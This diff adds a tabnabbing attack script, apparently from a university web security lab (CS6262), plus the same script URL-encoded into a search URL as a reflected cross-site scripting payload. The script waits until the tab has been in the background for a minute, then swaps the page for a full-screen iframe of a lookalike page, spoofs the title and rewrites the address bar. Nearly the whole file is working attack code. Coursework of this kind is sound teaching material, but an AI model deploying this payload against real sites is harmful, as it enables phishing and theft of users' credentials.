@@ -1,0 +1,40 @@
+<script>
+    var attackTimeout;
+    var blurredBefore = false;
+    let anchorTags = document.getElementsByTagName('a');
+    for (var i = 0; i < anchorTags.length; i++) {
+        anchorTags[i].target = '_blank';
+    }
+    function iframeAttack() {
+        document.body.remove();
+        let newBody = document.createElement('body');
+        newBody.style.margin = 0;
+        newBody.style.overflow = 'hidden';
+        let iframe = document.createElement('iframe');
+        iframe.src = 'https://cs6262.gtisc.gatech.edu/tabnabbing/kcable3/';
+        iframe.style.border = 0;
+        iframe.style.height = '100vh';
+        iframe.style.width = '100vw';
+        newBody.innerHTML = iframe.outerHTML;
+        document.documentElement.innerHTML = newBody.outerHTML;
+        document.title = 'Web Security Lab';
+        history.replaceState({}, '', 'https://cs6262.gtisc.gatech.edu/');
+    }
+    function onBlur() {
+        if (blurredBefore == true) {
+            attackTimeout = setTimeout(iframeAttack, 60000);
+        }
+    }
+    function onFocus() {
+        blurredBefore = true;
+        try {
+            clearTimeout(attackTimeout);
+        } catch {
+        }
+    }
+    window.addEventListener('focus', onFocus);
+    window.addEventListener('blur', onBlur);
+</script>
+
+iframe.className = 'fullscreen';
+https://cs6262.gtisc.gatech.edu/search?keyword=%3Cscript%3E+++++var+attackTimeout%3B+++++var+blurredBefore+%3D+false%3B+++++let+anchorTags+%3D+document.getElementsByTagName%28%27a%27%29%3B+++++for+%28var+i+%3D+0%3B+i+%3C+anchorTags.length%3B+i%2B%2B%29+%7B+++++++++anchorTags%5Bi%5D.target+%3D+%27_blank%27%3B+++++%7D+++++function+iframeAttack%28%29+%7B+++++++++document.body.remove%28%29%3B+++++++++let+newBody+%3D+document.createElement%28%27body%27%29%3B+++++++++newBody.style.margin+%3D+0%3B+++++++++newBody.style.overflow+%3D+%27hidden%27%3B+++++++++let+iframe+%3D+document.createElement%28%27iframe%27%29%3B+++++++++iframe.src+%3D+%27https%3A%2F%2Fcs6262.gtisc.gatech.edu%2Ftabnabbing%2Fkcable3%2F%27%3B+++++++++iframe.style.border+%3D+0%3B+++++++++iframe.style.height+%3D+%27100vh%27%3B+++++++++iframe.style.width+%3D+%27100vw%27%3B+++++++++newBody.innerHTML+%3D+iframe.outerHTML%3B+++++++++document.documentElement.innerHTML+%3D+newBody.outerHTML%3B+++++++++document.title+%3D+%27Web+Security+Lab%27%3B+++++%7D+++++function+onBlur%28%29+%7B+++++++++if+%28blurredBefore+%3D%3D+true%29+%7B+++++++++++++attackTimeout+%3D+setTimeout%28iframeAttack%2C+60000%29%3B+++++++++%7D+++++%7D+++++function+onFocus%28%29+%7B+++++++++blurredBefore+%3D+true%3B+++++++++try+%7B+++++++++++++clearTimeout%28attackTimeout%29%3B+++++++++%7D+catch+%7B+++++++++%7D+++++%7D+++++window.addEventListener%28%27focus%27%2C+onFocus%29%3B+++++window.addEventListener%28%27blur%27%2C+onBlur%29%3B+%3C%2Fscript%3E
